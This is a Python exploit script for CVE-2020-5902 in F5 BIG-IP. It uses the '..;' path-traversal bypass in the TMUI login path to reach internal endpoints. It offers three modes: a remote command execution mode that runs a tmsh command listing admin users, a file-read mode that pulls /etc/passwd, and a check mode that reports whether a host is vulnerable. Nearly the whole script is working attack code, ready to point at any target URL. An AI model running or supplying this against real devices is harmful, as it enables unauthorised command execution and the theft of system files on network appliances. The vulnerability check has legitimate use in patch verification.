import requests
import sys
import json
import argparse


parser = argparse.ArgumentParser('BIG-IP F5 - CVE 2020-5902. Usage python3 script.py -u https://<domain/IP> -o rce')
parser.add_argument('-u', '--url', required=True, help="Specify the URL you are testing")
parser.add_argument('-o', '--option',required=True, help="Specify check,read, or rce")
args = parser.parse_args()


url = args.url
choice = args.option
choice = choice.lower()

if (choice == "rce"):
    path = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin"
    fullUrl = url + path
    print("[+] Testing..... " + fullUrl)

    response = requests.get(fullUrl,verify=False)
    print(response.text)

elif (choice == "read"):
    path = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    fullUrl = url + path
    print("[+] Testing..... " + fullUrl)
    
    response = requests.get(fullUrl,verify=False)
    print(response.text) 

elif (choice == "check"):
    path = "/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp"
    fullUrl = url + path
    print("[+] Testing..... " + fullUrl)
    
    response = requests.get(fullUrl,verify=False)
    if "password_policy_table" in response.text:
        print(url + "-> VULNERABLE HOST. PATCH IMMEDIATELY")
    else:
        print(url + "-> IS NOT VULNERABLE!")

else:
    print("Choice not supported... user: rce,read,check")


